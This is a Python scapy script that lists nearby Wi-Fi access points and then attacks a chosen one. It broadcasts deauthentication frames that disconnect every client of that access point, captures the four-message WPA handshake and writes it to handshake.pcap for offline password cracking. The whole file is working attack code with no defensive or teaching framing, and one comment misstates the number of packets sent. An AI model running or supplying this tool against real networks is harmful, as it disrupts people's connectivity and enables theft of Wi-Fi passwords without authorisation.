from scapy.all import *
from scapy.utils import wrpcap
import threading
import time
import subprocess

stop_hoping=False #variable to terminate the channel_hoping


#finding the network interface
result=str(subprocess.run(["iwconfig"],capture_output=True, text=True))

results=result.split(" ")
iface=results[2].split("'")
iface=iface[1]

ifacemon=iface+"mon" #monitor interface

av_AP=[] #to store the available networks

cnt=0

def enable_monitor_mode(interface):
    """Enable monitor mode on the given interface."""
    with open('/dev/null', 'w') as FNULL:
        subprocess.run(['sudo', 'airmon-ng', 'start', interface], stdout=FNULL, stderr=FNULL)

def disable_monitor_mode(interface):
    """Disable monitor mode on the given interface."""
    with open('/dev/null', 'w') as FNULL:
        subprocess.run(['sudo', 'airmon-ng', 'stop', interface], stdout=FNULL, stderr=FNULL)


def change_channel(interface):
    """Continuously change Wi-Fi channels for better AP detection."""
    channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]  # 2.4GHz channels
    global stop_hoping
    while True:
        for channel in channels:
            if stop_hoping:
                break
            subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)  # Wait 1 second before switching

def find_AP(packet):
    """Scanning for beacon packets to find all the available access points"""
    global cnt
    if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp): #check if the sniffed packet is a Beacon one
        AP_mac=packet[Dot11].addr2 #mac address
        ssid = packet[Dot11Elt].info.decode(errors="ignore") #name
        channel = int(ord(packet[Dot11Elt:3].info)) #channel
        
        #type of encryption
        enc=None
        if packet.haslayer(Dot11WEP):
            enc="WEP"
        elif packet.haslayer(Dot11EltRSN):
            enc="WPA/WPA2"
        else:
            enc="None"
        
        AP={
            "MAC":AP_mac,
            "SSID":ssid,
            "CHANNEL":channel,
            "ENCRYPTION":enc
                }

        exists=False
        """no dublicate networks"""
        for network in av_AP:
            if AP["MAC"]==network["MAC"]:
                exists=True
        if not exists:
            av_AP.append(AP)
            cnt+=1
            print(f"{cnt}. | SSID:{AP['SSID']} | MAC ADDRESS: {AP['MAC']} | ENCRYPTION: {AP['ENCRYPTION']} | CHANNEL: {AP['CHANNEL']}")

def create_deauth_packet(sel_AP,iface):

    subprocess.run(["sudo","iwconfig",iface,"channel",str(sel_AP["CHANNEL"])],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    time.sleep(1)
    target_MAC="ff:ff:ff:ff:ff:ff" #targetig all users

    dst_MAC=sel_AP['MAC']

    deauth_packet = RadioTap() / Dot11(addr1=target_MAC, addr2=dst_MAC, addr3=dst_MAC) / Dot11Deauth(reason=7)
    return deauth_packet

handshakes={}

def capture_handshake(packet):
    """capturing the 4-way wifi handshake """
    global sel_AP
    ap_mac=sel_AP['MAC']
    if packet.haslayer(EAPOL) and packet.haslayer(Dot11):
        if ap_mac==packet[Dot11].addr2:
            mac=packet[Dot11].addr1
        else:
            mac=packet[Dot11].addr2
        if mac: 
            if mac not in handshakes:
                handshakes[mac]=[]
            handshakes[mac].append(packet)
        
            #stops when 4 EAPOL packets captured of the smae client
            if len(handshakes[mac])==4:
                return True

enable_monitor_mode(iface)

#thread to loop through channels
channel_hopper = threading.Thread(target=change_channel, args=(ifacemon,))
channel_hopper.daemon = True  # Allow it to stop when script ends
channel_hopper.start()

sniff(iface=ifacemon,prn=find_AP,store=0,timeout=15)

stop_hoping=True

choice=int(input("select access point:"))
mac_attacked=""
sel_AP=av_AP[choice-1]
	
deauth_packet=create_deauth_packet(sel_AP,ifacemon)
sendp(deauth_packet, iface=ifacemon, count=1, inter=0.1) #sends 5 packets every 0.1 sec

sniff(iface=ifacemon,prn=capture_handshake,store=0, timeout=15, stop_filter=lambda x: any(len(p) == 4 for p in handshakes.values()))
#print(handshakes)
for mac in handshakes:
    #print(mac)
    if(len(handshakes[mac])==4):
        mac_attacked=mac
        break
if mac_attacked!="":
    #print(handshakes[mac_attacked])

    #stores the handshake
    wrpcap("handshake.pcap", handshakes[mac_attacked])
else:
    print("Could not capture handshake. try again")
disable_monitor_mode(ifacemon)
